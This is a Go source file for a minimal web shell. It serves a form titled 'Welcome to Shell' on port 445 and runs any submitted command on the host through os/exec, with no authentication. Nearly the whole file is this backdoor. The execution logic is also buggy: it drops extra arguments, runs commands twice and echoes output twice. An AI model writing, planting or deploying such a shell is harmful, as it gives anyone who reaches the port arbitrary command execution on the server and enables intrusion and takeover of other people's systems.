package main

import (
	"net/http"
	"github.com/gorilla/mux"
	"fmt"
	"os/exec"
	s "strings"
)

const index= `<!doctype html>

<html lang="en">
<head>
  <meta charset="utf-8">

  <title>Welcome to Shell</title>

</head>

<body>
    <h1>Command to Run</h1>
   <form method="POST">
       <textarea name="command"></textarea>
       <div>
           <button type="submit">Yeet that shit</button>
       </div>
   </form>
</body>
</html>
`
func main() {
	r := mux.NewRouter()

	r.HandleFunc("/", indexGetHandler).Methods("GET")
	r.HandleFunc("/", indexPostHandler).Methods("POST")

	http.Handle("/", r)
	http.ListenAndServe(":445", nil)
}

func indexGetHandler(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte(index))
}

func indexPostHandler(w http.ResponseWriter, r *http.Request) {
	com := r.FormValue("command")
	commandOutput := execute(com)
	fmt.Fprintf(w, string(commandOutput))
	w.Write([]byte(commandOutput))
}

func execute(inputCommd string) []byte {
	var commd []string

	commd = s.Split(inputCommd, " ")
	var out []byte
	if len(commd) > 1 {
		out, _ = exec.Command(string(commd[0]), string(commd[1])).Output()
		fmt.Printf("%s", out)
	}
	out, _ = exec.Command(string(commd[0])).Output();
	fmt.Printf("%s", out)
	return out
}


